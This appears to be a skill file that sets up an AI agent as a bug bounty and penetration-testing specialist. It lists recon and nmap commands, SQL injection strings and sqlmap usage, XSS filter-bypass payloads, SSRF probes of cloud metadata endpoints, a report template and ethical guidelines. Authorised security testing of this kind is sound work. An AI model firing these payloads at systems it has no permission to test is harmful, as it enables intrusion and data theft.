---
name: bug-bounty-program
description: Эксперт по bug bounty. Используй для поиска уязвимостей, написания отчётов, responsible disclosure и penetration testing.
---

# Bug Bounty Program Specialist

Эксперт по исследованию уязвимостей и bug bounty hunting.

## Методология тестирования

### OWASP Top 10 Focus
1. Injection (SQL, NoSQL, LDAP, OS commands)
2. Broken Authentication
3. Sensitive Data Exposure
4. XML External Entities (XXE)
5. Broken Access Control
6. Security Misconfiguration
7. Cross-Site Scripting (XSS)
8. Insecure Deserialization
9. Using Components with Known Vulnerabilities
10. Insufficient Logging & Monitoring

### Распределение усилий
- Reconnaissance: 30%
- Manual testing: 50%
- Automated scanning: 20%

## Reconnaissance

### Subdomain Enumeration
```bash
# Пассивное перечисление
amass enum -passive -d target.com -o subdomains.txt

# Активное перечисление
subfinder -d target.com -all -o subfinder.txt

# DNS брутфорс
gobuster dns -d target.com -w wordlist.txt -o gobuster.txt

# Объединение результатов
cat subdomains.txt subfinder.txt gobuster.txt | sort -u > all_subs.txt
```

### Technology Stack Identification
```bash
# Wappalyzer CLI
wappalyzer https://target.com

# WhatWeb
whatweb -a 3 https://target.com

# Nuclei technology detection
nuclei -u https://target.com -t technologies/
```

### Port Scanning
```bash
# Быстрое сканирование
nmap -sS -sV -O -p- --min-rate 1000 target.com -oA nmap_full

# Сканирование сервисов
nmap -sC -sV -p 80,443,8080,8443 target.com -oA nmap_services
```

## SQL Injection Testing

### Manual Detection
```sql
-- Error-based
' OR '1'='1
' AND '1'='2
' UNION SELECT NULL--

-- Time-based blind
'; WAITFOR DELAY '00:00:05'--
' OR SLEEP(5)--

-- Boolean-based blind
' AND 1=1--
' AND 1=2--
```

### SQLMap
```bash
# Basic injection test
sqlmap -u "https://target.com/page?id=1" --batch

# With authentication
sqlmap -u "https://target.com/page?id=1" --cookie="session=abc123" --batch

# POST data
sqlmap -u "https://target.com/login" --data="user=test&pass=test" --batch

# Database enumeration
sqlmap -u "https://target.com/page?id=1" --dbs --batch
sqlmap -u "https://target.com/page?id=1" -D dbname --tables --batch
```

## XSS Testing

### Payload Types
```javascript
// Reflected XSS
<script>alert('XSS')</script>
<img src=x onerror=alert('XSS')>
<svg onload=alert('XSS')>

// DOM-based XSS
javascript:alert('XSS')
data:text/html,<script>alert('XSS')</script>

// Bypass filters
<ScRiPt>alert('XSS')</ScRiPt>
<img src=x onerror="&#x61;lert('XSS')">
<svg/onload=alert('XSS')>

// Stored XSS via different contexts
"><script>alert('XSS')</script>
'-alert('XSS')-'
</title><script>alert('XSS')</script>
```

### Context-Specific Payloads
```javascript
// In HTML attribute
" onfocus=alert('XSS') autofocus="
' onfocus=alert('XSS') autofocus='

// In JavaScript string
';alert('XSS');//
"-alert('XSS')-"

// In URL parameter
javascript:alert('XSS')
data:text/html,<script>alert('XSS')</script>
```

## SSRF Testing

### Basic Payloads
```
# Localhost bypass
http://127.0.0.1
http://localhost
http://[::1]
http://0.0.0.0
http://127.1
http://0177.0.0.1

# Cloud metadata
http://169.254.169.254/latest/meta-data/
http://metadata.google.internal/
```

### Detection Methods
```python
# Out-of-band detection using Burp Collaborator
url = "http://your-collaborator-id.burpcollaborator.net"

# Webhook.site for testing
url = "https://webhook.site/unique-id"
```

## Report Writing

### Structure
```markdown
# Vulnerability Report

## Summary
[One-line description]

## Severity
[Critical/High/Medium/Low] - CVSS Score: X.X

## Affected Component
[URL/Endpoint/Feature]

## Description
[Detailed technical explanation]

## Steps to Reproduce
1. [Step 1]
2. [Step 2]
3. [Step 3]

## Proof of Concept
[Screenshots, code, requests]

## Impact
[Business/technical impact]

## Remediation
[Specific recommendations]

## References
[CVE, OWASP, etc.]
```

### CVSS Calculator Factors
- Attack Vector (AV): Network/Adjacent/Local/Physical
- Attack Complexity (AC): Low/High
- Privileges Required (PR): None/Low/High
- User Interaction (UI): None/Required
- Scope (S): Unchanged/Changed
- Confidentiality Impact (C): None/Low/High
- Integrity Impact (I): None/Low/High
- Availability Impact (A): None/Low/High

## Tools Checklist

### Reconnaissance
- [ ] Amass / Subfinder
- [ ] Nmap
- [ ] Shodan
- [ ] Google Dorks

### Web Testing
- [ ] Burp Suite
- [ ] OWASP ZAP
- [ ] SQLMap
- [ ] Nuclei

### Automation
- [ ] ffuf (fuzzing)
- [ ] httpx (probing)
- [ ] waybackurls
- [ ] gau (URLs gathering)

## Ethical Guidelines

1. **Stay in scope** — тестируйте только разрешенные цели
2. **Don't be destructive** — избегайте DoS и потери данных
3. **Protect data** — не распространяйте найденные данные
4. **Report responsibly** — следуйте disclosure policy
5. **Document everything** — ведите детальные записи
6. **Respect rate limits** — не перегружайте системы

## Program Selection Strategy

### Criteria
- Response time history
- Bounty amounts
- Scope breadth
- Program maturity
- Community feedback

### Priority Matrix
| Program Type | Skill Level | Potential |
|--------------|-------------|-----------|
| New programs | Any | High |
| Broad scope | Intermediate | Medium |
| Narrow scope | Expert | Low-Medium |
| VDP only | Beginner | Low |
